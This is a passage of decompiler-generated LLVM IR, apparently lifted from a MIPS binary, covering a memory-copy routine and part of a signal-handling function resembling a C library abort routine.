  %v0_407e5c10 = phi i32 [ %v2_407df4, %dec_label_pc_407e08 ], [ %v2_407e24, %dec_label_pc_407e14 ]
  %v1_407e34 = phi i32 [ %v0_407dfc, %dec_label_pc_407e08 ], [ %v2_407e1c, %dec_label_pc_407e14 ]
  %v1_407e28 = urem i32 %v4_407e10, 32
  store i32 %v1_407e28, i32* %t0.global-to-local, align 4
  %v2_407e2c = icmp eq i32 %v4_407e10, %v1_407e28
  %v5_407e2c = sub i32 %v4_407e10, %v1_407e28
  store i32 %v5_407e2c, i32* %a3.global-to-local, align 4
  br i1 %v2_407e2c, label %dec_label_pc_407e88, label %dec_label_pc_407e30

dec_label_pc_407e30:                              ; preds = %dec_label_pc_407e28
  %v2_407e34 = add i32 %v1_407e34, %v5_407e2c
  store i32 %v2_407e34, i32* %a3.global-to-local, align 4
  store i32 %v1_407e28, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_407e3c

dec_label_pc_407e3c:                              ; preds = %dec_label_pc_407e3c.dec_label_pc_407e3c_crit_edge, %dec_label_pc_407e30
  %v0_407e5c = phi i32 [ %v0_407e5c.pre, %dec_label_pc_407e3c.dec_label_pc_407e3c_crit_edge ], [ %v0_407e5c10, %dec_label_pc_407e30 ]
  %v0_407e60 = phi i32 [ %v0_407e3c.pre, %dec_label_pc_407e3c.dec_label_pc_407e3c_crit_edge ], [ %v1_407e34, %dec_label_pc_407e30 ]
  %v1_407e3c = inttoptr i32 %v0_407e60 to i32*
  %v2_407e3c = load i32, i32* %v1_407e3c, align 4
  store i32 %v2_407e3c, i32* %t0.global-to-local, align 4
  %v1_407e40 = add i32 %v0_407e60, 4
  %v2_407e40 = inttoptr i32 %v1_407e40 to i32*
  %v3_407e40 = load i32, i32* %v2_407e40, align 4
  store i32 %v3_407e40, i32* %t1.global-to-local, align 4
  %v1_407e44 = add i32 %v0_407e60, 8
  %v2_407e44 = inttoptr i32 %v1_407e44 to i32*
  %v3_407e44 = load i32, i32* %v2_407e44, align 4
  store i32 %v3_407e44, i32* %t2.global-to-local, align 4
  %v1_407e48 = add i32 %v0_407e60, 12
  %v2_407e48 = inttoptr i32 %v1_407e48 to i32*
  %v3_407e48 = load i32, i32* %v2_407e48, align 4
  store i32 %v3_407e48, i32* %t3.global-to-local, align 4
  %v1_407e4c = add i32 %v0_407e60, 16
  %v2_407e4c = inttoptr i32 %v1_407e4c to i32*
  %v3_407e4c = load i32, i32* %v2_407e4c, align 4
  store i32 %v3_407e4c, i32* %t4.global-to-local, align 4
  %v1_407e50 = add i32 %v0_407e60, 20
  %v2_407e50 = inttoptr i32 %v1_407e50 to i32*
  %v3_407e50 = load i32, i32* %v2_407e50, align 4
  store i32 %v3_407e50, i32* %t5.global-to-local, align 4
  %v1_407e54 = add i32 %v0_407e60, 24
  %v2_407e54 = inttoptr i32 %v1_407e54 to i32*
  %v3_407e54 = load i32, i32* %v2_407e54, align 4
  store i32 %v3_407e54, i32* %t6.global-to-local, align 4
  %v1_407e58 = add i32 %v0_407e60, 28
  %v2_407e58 = inttoptr i32 %v1_407e58 to i32*
  %v3_407e58 = load i32, i32* %v2_407e58, align 4
  store i32 %v3_407e58, i32* %t7.global-to-local, align 4
  %v1_407e5c = add i32 %v0_407e5c, 32
  store i32 %v1_407e5c, i32* @a0, align 4
  %v1_407e60 = add i32 %v0_407e60, 32
  store i32 %v1_407e60, i32* @a1, align 4
  %v3_407e64 = inttoptr i32 %v0_407e5c to i32*
  store i32 %v2_407e3c, i32* %v3_407e64, align 4
  %v0_407e68 = load i32, i32* %t1.global-to-local, align 4
  %v1_407e68 = load i32, i32* @a0, align 4
  %v2_407e68 = add i32 %v1_407e68, -28
  %v3_407e68 = inttoptr i32 %v2_407e68 to i32*
  store i32 %v0_407e68, i32* %v3_407e68, align 4
  %v0_407e6c = load i32, i32* %t2.global-to-local, align 4
  %v1_407e6c = load i32, i32* @a0, align 4
  %v2_407e6c = add i32 %v1_407e6c, -24
  %v3_407e6c = inttoptr i32 %v2_407e6c to i32*
  store i32 %v0_407e6c, i32* %v3_407e6c, align 4
  %v0_407e70 = load i32, i32* %t3.global-to-local, align 4
  %v1_407e70 = load i32, i32* @a0, align 4
  %v2_407e70 = add i32 %v1_407e70, -20
  %v3_407e70 = inttoptr i32 %v2_407e70 to i32*
  store i32 %v0_407e70, i32* %v3_407e70, align 4
  %v0_407e74 = load i32, i32* %t4.global-to-local, align 4
  %v1_407e74 = load i32, i32* @a0, align 4
  %v2_407e74 = add i32 %v1_407e74, -16
  %v3_407e74 = inttoptr i32 %v2_407e74 to i32*
  store i32 %v0_407e74, i32* %v3_407e74, align 4
  %v0_407e78 = load i32, i32* %t5.global-to-local, align 4
  %v1_407e78 = load i32, i32* @a0, align 4
  %v2_407e78 = add i32 %v1_407e78, -12
  %v3_407e78 = inttoptr i32 %v2_407e78 to i32*
  store i32 %v0_407e78, i32* %v3_407e78, align 4
  %v0_407e7c = load i32, i32* %t6.global-to-local, align 4
  %v1_407e7c = load i32, i32* @a0, align 4
  %v2_407e7c = add i32 %v1_407e7c, -8
  %v3_407e7c = inttoptr i32 %v2_407e7c to i32*
  store i32 %v0_407e7c, i32* %v3_407e7c, align 4
  %v0_407e80 = load i32, i32* @a1, align 4
  %v1_407e80 = load i32, i32* %a3.global-to-local, align 4
  %v2_407e80 = icmp eq i32 %v0_407e80, %v1_407e80
  %v3_407e80 = load i32, i32* %t7.global-to-local, align 4
  %v4_407e80 = load i32, i32* @a0, align 4
  %v5_407e80 = add i32 %v4_407e80, -4
  %v6_407e80 = inttoptr i32 %v5_407e80 to i32*
  store i32 %v3_407e80, i32* %v6_407e80, align 4
  br i1 %v2_407e80, label %dec_label_pc_407e88.loopexit, label %dec_label_pc_407e3c.dec_label_pc_407e3c_crit_edge

dec_label_pc_407e3c.dec_label_pc_407e3c_crit_edge: ; preds = %dec_label_pc_407e3c
  %v0_407e3c.pre = load i32, i32* @a1, align 4
  %v0_407e5c.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_407e3c

dec_label_pc_407e88.loopexit:                     ; preds = %dec_label_pc_407e3c
  %v0_407e88.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_407e88

dec_label_pc_407e88:                              ; preds = %dec_label_pc_407e88.loopexit, %dec_label_pc_407e28
  %v0_407e88 = phi i32 [ %v0_407e88.pre, %dec_label_pc_407e88.loopexit ], [ %v4_407e10, %dec_label_pc_407e28 ]
  %v1_407e88 = urem i32 %v0_407e88, 4
  store i32 %v1_407e88, i32* %t0.global-to-local, align 4
  %v2_407e8c = icmp eq i32 %v0_407e88, %v1_407e88
  %v5_407e8c = sub i32 %v0_407e88, %v1_407e88
  store i32 %v5_407e8c, i32* %a3.global-to-local, align 4
  br i1 %v2_407e8c, label %dec_label_pc_407eb0, label %dec_label_pc_407e90

dec_label_pc_407e90:                              ; preds = %dec_label_pc_407e88
  %v1_407e94 = load i32, i32* @a1, align 4
  %v2_407e94 = add i32 %v1_407e94, %v5_407e8c
  store i32 %v2_407e94, i32* %a3.global-to-local, align 4
  store i32 %v1_407e88, i32* %a2.global-to-local, align 4
  %v1_407e9c31 = inttoptr i32 %v1_407e94 to i32*
  %v2_407e9c32 = load i32, i32* %v1_407e9c31, align 4
  store i32 %v2_407e9c32, i32* %t0.global-to-local, align 4
  %v0_407ea033 = load i32, i32* @a0, align 4
  %v1_407ea034 = add i32 %v0_407ea033, 4
  store i32 %v1_407ea034, i32* @a0, align 4
  %v1_407ea435 = add i32 %v1_407e94, 4
  store i32 %v1_407ea435, i32* @a1, align 4
  %v2_407ea836 = icmp eq i32 %v1_407ea435, %v2_407e94
  %v6_407ea837 = inttoptr i32 %v0_407ea033 to i32*
  store i32 %v2_407e9c32, i32* %v6_407ea837, align 4
  br i1 %v2_407ea836, label %dec_label_pc_407eb0.loopexit, label %dec_label_pc_407e9c.dec_label_pc_407e9c_crit_edge

dec_label_pc_407e9c.dec_label_pc_407e9c_crit_edge: ; preds = %dec_label_pc_407e90, %dec_label_pc_407e9c.dec_label_pc_407e9c_crit_edge
  %v0_407e9c.pre = load i32, i32* @a1, align 4
  %v1_407ea8.pre = load i32, i32* %a3.global-to-local, align 4
  %v1_407e9c = inttoptr i32 %v0_407e9c.pre to i32*
  %v2_407e9c = load i32, i32* %v1_407e9c, align 4
  store i32 %v2_407e9c, i32* %t0.global-to-local, align 4
  %v0_407ea0 = load i32, i32* @a0, align 4
  %v1_407ea0 = add i32 %v0_407ea0, 4
  store i32 %v1_407ea0, i32* @a0, align 4
  %v1_407ea4 = add i32 %v0_407e9c.pre, 4
  store i32 %v1_407ea4, i32* @a1, align 4
  %v2_407ea8 = icmp eq i32 %v1_407ea4, %v1_407ea8.pre
  %v6_407ea8 = inttoptr i32 %v0_407ea0 to i32*
  store i32 %v2_407e9c, i32* %v6_407ea8, align 4
  br i1 %v2_407ea8, label %dec_label_pc_407eb0.loopexit, label %dec_label_pc_407e9c.dec_label_pc_407e9c_crit_edge

dec_label_pc_407eb0.loopexit:                     ; preds = %dec_label_pc_407e9c.dec_label_pc_407e9c_crit_edge, %dec_label_pc_407e90
  %v0_407eb0.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_407eb0

dec_label_pc_407eb0:                              ; preds = %dec_label_pc_407eb0.loopexit, %dec_label_pc_407e88, %dec_label_pc_407df0
  %v0_407eb0 = phi i32 [ %v0_407eb0.pre, %dec_label_pc_407eb0.loopexit ], [ %v0_407e88, %dec_label_pc_407e88 ], [ %v0_407df0, %dec_label_pc_407df0 ]
  %v1_407eb0 = icmp slt i32 %v0_407eb0, 1
  %v3_407eb0 = load i32, i32* @a1, align 4
  %v4_407eb0 = add i32 %v3_407eb0, %v0_407eb0
  store i32 %v4_407eb0, i32* @a3, align 4
  br i1 %v1_407eb0, label %dec_label_pc_407ecc, label %dec_label_pc_407eb8.preheader

dec_label_pc_407eb8.preheader:                    ; preds = %dec_label_pc_407eb0
  %v1_407eb823 = inttoptr i32 %v3_407eb0 to i8*
  %v2_407eb824 = load i8, i8* %v1_407eb823, align 1
  %v3_407eb825 = sext i8 %v2_407eb824 to i32
  store i32 %v3_407eb825, i32* %t0.global-to-local, align 4
  %v0_407ebc26 = load i32, i32* @a0, align 4
  %v1_407ebc27 = add i32 %v0_407ebc26, 1
  store i32 %v1_407ebc27, i32* %a0.global-to-local, align 4
  %v1_407ec028 = add i32 %v3_407eb0, 1
  store i32 %v1_407ec028, i32* %a1.global-to-local, align 4
  %v2_407ec429 = icmp eq i32 %v1_407ec028, %v4_407eb0
  %v7_407ec430 = inttoptr i32 %v0_407ebc26 to i8*
  store i8 %v2_407eb824, i8* %v7_407ec430, align 1
  br i1 %v2_407ec429, label %dec_label_pc_407ecc, label %dec_label_pc_407eb8.dec_label_pc_407eb8_crit_edge

dec_label_pc_407eb8.dec_label_pc_407eb8_crit_edge: ; preds = %dec_label_pc_407eb8.preheader, %dec_label_pc_407eb8.dec_label_pc_407eb8_crit_edge
  %v0_407eb8.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_407ec4.pre = load i32, i32* @a3, align 4
  %v1_407eb8 = inttoptr i32 %v0_407eb8.pre to i8*
  %v2_407eb8 = load i8, i8* %v1_407eb8, align 1
  %v3_407eb8 = sext i8 %v2_407eb8 to i32
  store i32 %v3_407eb8, i32* %t0.global-to-local, align 4
  %v0_407ebc = load i32, i32* %a0.global-to-local, align 4
  %v1_407ebc = add i32 %v0_407ebc, 1
  store i32 %v1_407ebc, i32* %a0.global-to-local, align 4
  %v1_407ec0 = add i32 %v0_407eb8.pre, 1
  store i32 %v1_407ec0, i32* %a1.global-to-local, align 4
  %v2_407ec4 = icmp eq i32 %v1_407ec0, %v1_407ec4.pre
  %v7_407ec4 = inttoptr i32 %v0_407ebc to i8*
  store i8 %v2_407eb8, i8* %v7_407ec4, align 1
  br i1 %v2_407ec4, label %dec_label_pc_407ecc, label %dec_label_pc_407eb8.dec_label_pc_407eb8_crit_edge

dec_label_pc_407ecc:                              ; preds = %dec_label_pc_407eb8.preheader, %dec_label_pc_407eb8.dec_label_pc_407eb8_crit_edge, %dec_label_pc_407eb0
  ret i32 %v2_407df4

dec_label_pc_407ed4:                              ; preds = %dec_label_pc_407df8
  %v1_407ed4 = sub i32 0, %v2_407df4
  %v1_407ed8 = urem i32 %v1_407ed4, 4
  store i32 %v1_407ed8, i32* %a3.global-to-local, align 4
  %v1_407edc = icmp eq i32 %v1_407ed8, 0
  %v4_407edc = sub i32 %v0_407df0, %v1_407ed8
  store i32 %v4_407edc, i32* %a2.global-to-local, align 4
  br i1 %v1_407edc, label %dec_label_pc_407ef8, label %dec_label_pc_407ee0

dec_label_pc_407ee0:                              ; preds = %dec_label_pc_407ed4
  %v2_407eec = add i32 %v0_407dfc, %v1_407ed8
  store i32 %v2_407eec, i32* %a1.global-to-local, align 4
  %v2_407ef4 = add i32 %v1_407ed8, %v2_407df4
  store i32 %v2_407ef4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407ef8

dec_label_pc_407ef8:                              ; preds = %dec_label_pc_407ed4, %dec_label_pc_407ee0
  %v0_407f0c3 = phi i32 [ %v2_407df4, %dec_label_pc_407ed4 ], [ %v2_407ef4, %dec_label_pc_407ee0 ]
  %v1_407f00 = phi i32 [ %v0_407dfc, %dec_label_pc_407ed4 ], [ %v2_407eec, %dec_label_pc_407ee0 ]
  %v1_407ef8 = urem i32 %v4_407edc, 4
  store i32 %v1_407ef8, i32* %t0.global-to-local, align 4
  %v2_407efc = sub i32 %v4_407edc, %v1_407ef8
  %v2_407f00 = add i32 %v1_407f00, %v2_407efc
  store i32 %v2_407f00, i32* @a3, align 4
  %v1_407f0c38 = add i32 %v0_407f0c3, 4
  store i32 %v1_407f0c38, i32* %a0.global-to-local, align 4
  %v1_407f1039 = add i32 %v1_407f00, 4
  store i32 %v1_407f1039, i32* %a1.global-to-local, align 4
  %v2_407f1440 = icmp eq i32 %v1_407f1039, %v2_407f00
  %v6_407f1441 = inttoptr i32 %v0_407f0c3 to i32*
  store i32 %v3_407e04, i32* %v6_407f1441, align 4
  br i1 %v2_407f1440, label %dec_label_pc_407f18, label %dec_label_pc_407f04.dec_label_pc_407f04_crit_edge

dec_label_pc_407f04.dec_label_pc_407f04_crit_edge: ; preds = %dec_label_pc_407ef8, %dec_label_pc_407f04.dec_label_pc_407f04_crit_edge
  %v0_407f0c.pre = load i32, i32* %a0.global-to-local, align 4
  %v0_407f10.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_407f14.pre = load i32, i32* @a3, align 4
  %v3_407f14.pre = load i32, i32* %t1.global-to-local, align 4
  %v1_407f0c = add i32 %v0_407f0c.pre, 4
  store i32 %v1_407f0c, i32* %a0.global-to-local, align 4
  %v1_407f10 = add i32 %v0_407f10.pre, 4
  store i32 %v1_407f10, i32* %a1.global-to-local, align 4
  %v2_407f14 = icmp eq i32 %v1_407f10, %v1_407f14.pre
  %v6_407f14 = inttoptr i32 %v0_407f0c.pre to i32*
  store i32 %v3_407f14.pre, i32* %v6_407f14, align 4
  br i1 %v2_407f14, label %dec_label_pc_407f18, label %dec_label_pc_407f04.dec_label_pc_407f04_crit_edge

dec_label_pc_407f18:                              ; preds = %dec_label_pc_407f04.dec_label_pc_407f04_crit_edge, %dec_label_pc_407ef8
  %v0_407f20 = load i32, i32* %t0.global-to-local, align 4
  store i32 %v0_407f20, i32* %a2.global-to-local, align 4
  ret i32 %v2_407df4

; uselistorder directives
  uselistorder i32 %v0_407f0c.pre, { 1, 0 }
  uselistorder i32 %v1_407ef8, { 1, 0 }
  uselistorder i32 %v4_407edc, { 1, 0, 2 }
  uselistorder i32 %v1_407ed8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_407eb8.pre, { 1, 0 }
  uselistorder i32 %v0_407e9c.pre, { 1, 0 }
  uselistorder i32 %v1_407e88, { 3, 1, 2, 0 }
  uselistorder i32 %v0_407e88, { 1, 2, 3, 0 }
  uselistorder i32 %v0_407e60, { 0, 2, 1, 4, 3, 6, 5, 8, 7 }
  uselistorder i32 %v0_407e5c, { 1, 0 }
  uselistorder i32 %v1_407e28, { 3, 1, 2, 0 }
  uselistorder i32 %v1_407e34, { 1, 0 }
  uselistorder i32 %v4_407e10, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_407e0c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_407e04, { 1, 0, 2 }
  uselistorder i32 %v1_407e00, { 1, 0 }
  uselistorder i32 %v0_407dfc, { 4, 0, 3, 1, 5, 2 }
  uselistorder i32 %v2_407df4, { 6, 4, 0, 5, 7, 3, 1, 2 }
  uselistorder i32 %v0_407df0, { 2, 0, 1, 3 }
  uselistorder i32* %t1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %t0.global-to-local, { 0, 1, 2, 9, 3, 10, 4, 5, 6, 7, 8 }
  uselistorder i32* %a1.global-to-local, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32* %a0.global-to-local, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32* @a3, { 1, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 9, 5, 4, 8, 32, 33, 10, 34, 35, 36, 37, 3, 38, 39, 40, 41, 42, 7, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 6, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32 -8, { 2, 3, 1, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 20, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32 16, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 2, 28, 0, 29, 30, 31, 32, 33, 34, 35, 36, 37, 3, 38, 4, 39, 40, 5, 6, 7, 1 }
  uselistorder i32 8, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 6, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0, 33, 34, 35, 1, 36, 37, 2, 38, 5, 3, 39, 40, 41, 42, 43, 4, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 8, 9, 10, 7, 69, 70, 71, 72, 73 }
  uselistorder i32* @a2, { 7, 8, 9, 5, 3, 10, 6, 11, 12, 13, 14, 15, 16, 17, 1, 18, 4, 19, 20, 2, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder label %dec_label_pc_407f04.dec_label_pc_407f04_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407ef8, { 1, 0 }
  uselistorder label %dec_label_pc_407ecc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_407eb8.dec_label_pc_407eb8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407e9c.dec_label_pc_407e9c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_407e28, { 1, 0 }
}

define i32 @function_407f30() local_unnamed_addr {
dec_label_pc_407f30:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp10 = alloca i32, align 4
  %tmp11 = alloca i32, align 4
  %v1_407f38 = load i32, i32* @t9, align 4
  %v2_407f38 = add i32 %v1_407f38, 301696
  store i32 %v2_407f38, i32* %gp.global-to-local, align 4
  %v3_407f50 = load i32, i32* @global_var_449c58.182, align 4
  store i32 %v3_407f50, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_4499a0.258 to i32), i32* %a0.global-to-local, align 4
  %v5_407f58 = call i32 @function_4051f0(i32* nonnull @global_var_4499a0.258)
  store i32 %v2_407f38, i32* %gp.global-to-local, align 4
  %v2_407f64 = ptrtoint i32* %tmp10 to i32
  store i32 %v2_407f64, i32* @s0, align 4
  store i32 32, i32* %v1.global-to-local, align 4
  %v2_407f7020 = add i32 %v5_407f58, %v2_407f64
  %v1_407f7421 = inttoptr i32 %v2_407f7020 to i32*
  store i32 0, i32* %v1_407f7421, align 4
  %v0_407f7822 = load i32, i32* %v1.global-to-local, align 4
  %v1_407f7823 = add i32 %v0_407f7822, -1
  store i32 %v1_407f7823, i32* %v1.global-to-local, align 4
  %v1_407f7c24 = icmp sgt i32 %v1_407f7823, -1
  %v3_407f7c25 = mul i32 %v1_407f7823, 4
  store i32 %v3_407f7c25, i32* %v0.global-to-local, align 4
  br i1 %v1_407f7c24, label %dec_label_pc_407f70.dec_label_pc_407f70_crit_edge, label %dec_label_pc_407f80

dec_label_pc_407f70.dec_label_pc_407f70_crit_edge: ; preds = %dec_label_pc_407f30, %dec_label_pc_407f70.dec_label_pc_407f70_crit_edge
  %v3_407f7c26 = phi i32 [ %v3_407f7c, %dec_label_pc_407f70.dec_label_pc_407f70_crit_edge ], [ %v3_407f7c25, %dec_label_pc_407f30 ]
  %v1_407f70.pre = load i32, i32* @s0, align 4
  %v2_407f70 = add i32 %v3_407f7c26, %v1_407f70.pre
  %v1_407f74 = inttoptr i32 %v2_407f70 to i32*
  store i32 0, i32* %v1_407f74, align 4
  %v0_407f78 = load i32, i32* %v1.global-to-local, align 4
  %v1_407f78 = add i32 %v0_407f78, -1
  store i32 %v1_407f78, i32* %v1.global-to-local, align 4
  %v1_407f7c = icmp sgt i32 %v1_407f78, -1
  %v3_407f7c = mul i32 %v1_407f78, 4
  store i32 %v3_407f7c, i32* %v0.global-to-local, align 4
  br i1 %v1_407f7c, label %dec_label_pc_407f70.dec_label_pc_407f70_crit_edge, label %dec_label_pc_407f80

dec_label_pc_407f80:                              ; preds = %dec_label_pc_407f70.dec_label_pc_407f70_crit_edge, %dec_label_pc_407f30
  %v3_407f84 = load i32, i32* @global_var_449bb4.194, align 4
  store i32 %v3_407f84, i32* @t9, align 4
  store i32 %v2_407f64, i32* @a0, align 4
  store i32 6, i32* @a1, align 4
  %v1_407f8c = call i32 @function_404bc0()
  store i32 %v1_407f8c, i32* %v0.global-to-local, align 4
  store i32 %v2_407f38, i32* %gp.global-to-local, align 4
  %v1_407f98 = icmp eq i32 %v1_407f8c, 0
  store i32 %v2_407f64, i32* %a1.global-to-local, align 4
  br i1 %v1_407f98, label %dec_label_pc_407f9c, label %dec_label_pc_407fb8

dec_label_pc_407f9c:                              ; preds = %dec_label_pc_407f80
  store i32 2, i32* %a0.global-to-local, align 4
  %v1_407fa8 = call i32 @unknown_0()
  store i32 %v1_407fa8, i32* %v0.global-to-local, align 4
  store i32 %v2_407f38, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_407fb8

dec_label_pc_407fb8:                              ; preds = %dec_label_pc_407f80, %dec_label_pc_407f9c
  %v3_407fb8 = load i32, i32* @global_var_4499c8.2, align 4
  store i32 %v3_407fb8, i32* %v1.global-to-local, align 4
  %v3_407fc0 = load i32, i32* @global_var_449d50.259, align 4
  %v1_407fc8 = icmp eq i32 %v3_407fc0, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_407fc8, label %dec_label_pc_407fcc, label %dec_label_pc_408020

dec_label_pc_407fcc:                              ; preds = %dec_label_pc_407fb8
  store i32 1, i32* @global_var_449d50.259, align 4
  store i32 %v3_407fb8, i32* @s0, align 4
  %v3_407fd8 = load i32, i32* @global_var_449ba8.181, align 4
  store i32 %v3_407fd8, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_4499a0.258 to i32), i32* %a0.global-to-local, align 4
  %v3_407fe0 = call i32 @function_4006d0()
  store i32 %v3_407fe0, i32* %v0.global-to-local, align 4
  store i32 %v2_407f38, i32* %gp.global-to-local, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  %v1_407ff8 = call i32 @unknown_0()
  store i32 %v1_407ff8, i32* %v0.global-to-local, align 4
  store i32 %v2_407f38, i32* %gp.global-to-local, align 4
  %v3_408008 = load i32, i32* @global_var_449c58.182, align 4
  store i32 %v3_408008, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_4499a0.258 to i32), i32* %a0.global-to-local, align 4
  %v5_408010 = call i32 @function_4051f0(i32* nonnull @global_var_4499a0.258)
  store i32 %v5_408010, i32* %v0.global-to-local, align 4
  store i32 %v2_407f38, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_408020

dec_label_pc_408020:                              ; preds = %dec_label_pc_407fb8, %dec_label_pc_407fcc
  %v1_408020 = add i32 %v1_407f38, 268952
  %v2_408020 = inttoptr i32 %v1_408020 to i32*
  %v3_408020 = load i32, i32* %v2_408020, align 4
  store i32 %v3_408020, i32* %a0.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v1_408028 = add i32 %v3_408020, -25264
  %v2_408028 = inttoptr i32 %v1_408028 to i32*
  %v3_408028 = load i32, i32* %v2_408028, align 4
  store i32 %v3_408028, i32* %v1.global-to-local, align 4
  %v2_408030 = icmp eq i32 %v3_408028, 1
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_408030, label %dec_label_pc_408034, label %dec_label_pc_4080a0

dec_label_pc_408034:                              ; preds = %dec_label_pc_408020
  %v1_408038 = add i32 %v1_407f38, 268980
  %v2_408038 = inttoptr i32 %v1_408038 to i32*
  %v3_408038 = load i32, i32* %v2_408038, align 4
  store i32 2, i32* %v2_408028, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v2_408044 = ptrtoint i32* %tmp11 to i32
  store i32 %v2_408044, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_408038)
  store i32 %v2_407f38, i32* %gp.global-to-local, align 4
  store i32 32, i32* %v1.global-to-local, align 4
  store i32 %v2_407f64, i32* %a1.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v0_408068.pre = load i32, i32* %v0.global-to-local, align 4
  %v2_40806812 = add i32 %v2_407f64, 136
  %v2_40806c13 = add i32 %v2_40806812, %v0_408068.pre
  %v3_40806c14 = inttoptr i32 %v2_40806c13 to i32*
  store i32 -1, i32* %v3_40806c14, align 4
  %v0_40807015 = load i32, i32* %v1.global-to-local, align 4
  %v1_40807016 = add i32 %v0_40807015, -1
  store i32 %v1_40807016, i32* %v1.global-to-local, align 4
  %v1_40807417 = icmp sgt i32 %v1_40807016, -1
  %v3_40807418 = mul i32 %v1_40807016, 4
  store i32 %v3_40807418, i32* @v0, align 4
  br i1 %v1_40807417, label %dec_label_pc_408068.dec_label_pc_408068_crit_edge, label %dec_label_pc_408078

dec_label_pc_408068.dec_label_pc_408068_crit_edge: ; preds = %dec_label_pc_408034, %dec_label_pc_408068.dec_label_pc_408068_crit_edge
  %v3_40807419 = phi i32 [ %v3_408074, %dec_label_pc_408068.dec_label_pc_408068_crit_edge ], [ %v3_40807418, %dec_label_pc_408034 ]
  %v1_408068.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_40806c.pre = load i32, i32* %a0.global-to-local, align 4
  %v2_408068 = add i32 %v1_408068.pre, 136
  %v2_40806c = add i32 %v2_408068, %v3_40807419
  %v3_40806c = inttoptr i32 %v2_40806c to i32*
  store i32 %v0_40806c.pre, i32* %v3_40806c, align 4
  %v0_408070 = load i32, i32* %v1.global-to-local, align 4
  %v1_408070 = add i32 %v0_408070, -1
  store i32 %v1_408070, i32* %v1.global-to-local, align 4
  %v1_408074 = icmp sgt i32 %v1_408070, -1
  %v3_408074 = mul i32 %v1_408070, 4
  store i32 %v3_408074, i32* @v0, align 4
  br i1 %v1_408074, label %dec_label_pc_408068.dec_label_pc_408068_crit_edge, label %dec_label_pc_408078

dec_label_pc_408078:                              ; preds = %dec_label_pc_408068.dec_label_pc_408068_crit_edge, %dec_label_pc_408034
  store i32 0, i32* %tmp11, align 4
  store i32 6, i32* %a0.global-to-local, align 4
  store i32 %v2_408044, i32* %a1.global-to-local, align 4
  %v3_40808c = call i32 @function_406dac(i32 6, i32 %v2_408044)
  store i32 %v3_40808c, i32* %v0.global-to-local, align 4
  store i32 %v2_407f38, i32* %gp.global-to-local, align 4
  %v0_4080a0.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4080a0

dec_label_pc_4080a0:                              ; preds = %dec_label_pc_408020, %dec_label_pc_408078
  %v1_4080a0 = phi i32 [ 2, %dec_label_pc_408020 ], [ %v3_40808c, %dec_label_pc_408078 ]
  %v0_4080a0 = phi i32 [ %v3_408028, %dec_label_pc_408020 ], [ %v0_4080a0.pre, %dec_label_pc_408078 ]
  %v2_4080a0 = icmp eq i32 %v0_4080a0, %v1_4080a0
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_4080a0, label %dec_label_pc_4080a4, label %dec_label_pc_4080b0

dec_label_pc_4080a4:                              ; preds = %dec_label_pc_4080a0
  %v1_4080a8 = load i32, i32* %a0.global-to-local, align 4
  %v2_4080a8 = add i32 %v1_4080a8, -25264
  %v3_4080a8 = inttoptr i32 %v2_4080a8 to i32*
  store i32 3, i32* %v3_4080a8, align 4
  br label %dec_label_pc_4080b0

dec_label_pc_4080b0:                              ; preds = %dec_label_pc_4080a0, %dec_label_pc_4080a4
  %v0_4080b0 = load i32, i32* %a0.global-to-local, align 4
  %v1_4080b0 = add i32 %v0_4080b0, -25264
  %v2_4080b0 = inttoptr i32 %v1_4080b0 to i32*
  %v3_4080b0 = load i32, i32* %v2_4080b0, align 4
  store i32 %v3_4080b0, i32* %v1.global-to-local, align 4
  %v2_4080b8 = icmp eq i32 %v3_4080b0, 3
